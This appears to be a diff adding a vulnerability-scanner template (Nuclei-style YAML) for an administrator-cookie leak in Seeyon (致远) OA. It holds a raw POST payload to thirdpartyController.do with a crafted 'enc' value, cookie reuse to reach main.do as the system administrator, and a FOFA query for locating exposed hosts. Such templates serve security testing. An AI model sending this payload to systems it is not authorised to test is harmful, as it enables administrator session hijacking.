@@ -1,0 +1,43 @@
+id: poc-local-oa-seeyon-thirdpartyController-cookie-leak
+
+info:
+  name: 致远OA-thirdpartyController.do-管理员cookie获取
+  author: capiton
+  severity: critical
+  description: 致远OA-thirdpartyController.do-管理员cookie获取
+  reference:
+    - https://mp.weixin.qq.com/s/0AqdfTrZUVrwTMbKEKresg
+  metadata:
+    fofa-query: app="致远互联-OA"
+    Vulnerability-Impact: unknown
+  tags: seeyon,zhiyuan
+
+requests:
+  - raw:
+      - |+
+        POST /seeyon/thirdpartyController.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
+
+      - |+
+        GET /seeyon/main.do?method=headerjs HTTP/1.1
+        Host: {{Hostname}}
+
+      
+    cookie-reuse: true
+    redirects: false    
+    matchers-condition: and
+    matchers:
+      - type: status
+        condition: and
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "\"name\":\"系统管理员\""
+          - "\"id\":\"-7273032013234748168\""
